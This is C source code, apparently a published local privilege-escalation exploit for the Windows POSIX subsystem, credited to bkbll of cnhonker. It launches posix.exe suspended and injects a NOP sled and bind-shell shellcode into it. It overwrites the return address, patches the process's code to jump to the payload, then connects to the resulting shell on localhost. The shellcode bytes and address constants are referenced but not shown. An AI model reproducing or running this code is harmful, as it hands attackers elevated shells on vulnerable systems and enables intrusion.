main()
{
   STARTUPINFO si;
   PROCESS_INFORMATION pi;
   LPVOID pdwCodeRemote;
   unsigned int cbMemSize = MEMSIZE;
   DWORD dwOldProtect,dwNumBytesXferred;
   unsigned char buffer[MEMSIZE];
   unsigned int buflen=0;
   unsigned char textbuf[CODESIZE];
   int i;
   unsigned short lports;
   char cmdarg[400];
   char systemdir[MAX_PATH+1];
   WSADATA    wsd;
   SOCKET sockfd;
   
   printf("Microsoft Windows POSIX Subsystem Local Privilege Escalation Exploit(%s)\n",VERSION);
   printf("By bkbll (bkbll#cnhonker.net,bkbll#tom.com) www.cnhonker.com\;n\n");
   if (WSAStartup(MAKEWORD(2,2), &wsd) != 0)
   {
       printf("[-] WSAStartup error:%d\n", WSAGetLastError());
       return -1;
   }
   
   i = GetWindowsDirectory(systemdir,MAX_PATH);
   systemdir[i]='\0';
   _snprintf(cmdarg,sizeof(cmdarg)-1,"%s\\system32\\posix.exe /P %s\\system32\\pax.exe /C 
pax -h",systemdir,systemdir);
   //printf("cmdarg:%s\n",cmdarg);
   //exit(0);
   ZeroMemory(&si,sizeof(si));
   si.cb = sizeof(si);
   ZeroMemory( &pi,sizeof(pi));
   //create process
   //&#20808;&#35753;psxss&#36816;&#34892;&#36215;&#26469;
   if(!CreateProcess(NULL, cmdarg, NULL, NULL, TRUE, 0, 0, 0, &si, &pi))
   {
    printf("CreateProcess1 failed:%d\n", GetLastError());
    return 0;
   }
   WaitForSingleObject(pi.hProcess, INFINITE);
   //&#20877;&#36816;&#34892;&#19968;&#27425;
   ZeroMemory(&si,sizeof(si));
   si.cb = sizeof(si);
   ZeroMemory( &pi,sizeof(pi));
   if(!CreateProcess(NULL, cmdarg, NULL, NULL, TRUE,CREATE_SUSPENDED, 0, 0, &si, &pi))
   {
    printf("CreateProcess2 failed:%d\n", GetLastError());
    return 0;
   }
   //alloc from remote process
   pdwCodeRemote = (PDWORD)VirtualAllocEx(pi.hProcess, NULL, cbMemSize,MEM_COMMIT | 
   MEM_TOP_DOWN,PAGE_EXECUTE_READWRITE);
   if (pdwCodeRemote == NULL) 
   {
       TerminateProcess(pi.hProcess,0);
       printf("VirtualAllocEx failed:%d\n",GetLastError());
       return 0;
   }
   printf("Remote addr:0x%08x\n",pdwCodeRemote);
   //we can write and execute
   if(!VirtualProtectEx(pi.hProcess, pdwCodeRemote, cbMemSize,PAGE_EXECUTE_READWRITE, &dwOldProtect)) 
   {
       TerminateProcess(pi.hProcess,0);
       printf("VirtualProtectEx failed:%d\n",GetLastError());
       return 0;
   }
   //make shellcode    
   lports = htons(bindport)^0xeeee;
   memcpy(bind_shell+bind_port_offset,&lports,2);
   
   memset(buffer,'\x90',MEMSIZE);
   //memset(buffer,'A',EIPLOCATION);
   buffer[MEMSIZE-1] = '\0';
   i=sizeof(bind_shell)-1;
   if(i >= EIPLOCATION) 
   {
       printf("shellcode so large:%d,must < %d\n",i,MEMSIZE);
       TerminateProcess(pi.hProcess,0);
       return 0;
   }
   i=EIPLOCATION-i;
   memcpy(buffer+i,bind_shell,sizeof(bind_shell)-1);
   *(unsigned int*)(buffer+EIPLOCATION) = RETADDR; //&#35206;&#30422;eip
   *(unsigned int*)(buffer+EIPLOCATION+4) =CANWRITEADDR; //&#35206;&#30422;&#31532;&#19968;&#20010;&#21442;&#25968;
   memcpy(buffer+EIPLOCATION+12,jmpcode,sizeof(jmpcode)-1);
   //write in to target
   buflen=MEMSIZE;
   if(!WriteProcessMemory(pi.hProcess,pdwCodeRemote,buffer,buflen,&dwNumBytesXferred)) 
   {
       TerminateProcess(pi.hProcess,0);
       printf("WriteProcessMemory failed:%d\n",GetLastError());
       return 0;
   }
   //modified the process .text
   if(!VirtualProtectEx(pi.hProcess,(LPVOID)PATCHADDR,CODESIZE,PAGE_EXECUTE_READWRITE, &dwOldProtect)) 
   {
       TerminateProcess(pi.hProcess,0);
       printf("VirtualProtectEx 0x08x failed:%d\n",PATCHADDR,GetLastError());
       return 0;
   }
   //&#21019;&#24314;&#35201;&#20462;&#34917;&#30340;&#20869;&#23481;
   i = 0;
   textbuf[i++]='\xbf';
   textbuf[i++]=(DWORD)pdwCodeRemote & 0xff;    //mov edi,pdwCodeRemote
   textbuf[i++]=((DWORD)pdwCodeRemote >> 8 ) & 0xff;
   textbuf[i++]=((DWORD)pdwCodeRemote >> 16 ) & 0xff;
   textbuf[i++]=((DWORD)pdwCodeRemote >> 24 ) & 0xff;
   //&#26367;&#25442;&#36339;&#36716;&#25351;&#20196;
   textbuf[i++]='\xeb';
   textbuf[i++]='\x09'; //jmp .+0b
   //&#20889;&#36827;&#36827;&#31243;&#20013;
   if(!WriteProcessMemory(pi.hProcess,(LPVOID)PATCHADDR,textbuf,i,&dwNumBytesXferred)) 
   {
       TerminateProcess(pi.hProcess,0);
       printf("WriteProcessMemory failed:%d\n",GetLastError());
       return 0;
   }
   ResumeThread(pi.hThread);
   Sleep(5);
   sockfd=WSASocket(2,1,0,0,0,0);
   if(sockfd == INVALID_SOCKET)
   {
       printf("[-] WSASocket error:%d\n", WSAGetLastError());
       return -1;
   }
   if(client_connect(sockfd,"127.0.0.1",bindport) < 0)
   {
       closesocket(sockfd);
       printf("[-] Maybe not success?\n");
   }
   readwrite(sockfd);
   TerminateProcess(pi.hProcess,0);
   WaitForSingleObject(pi.hProcess, INFINITE);
}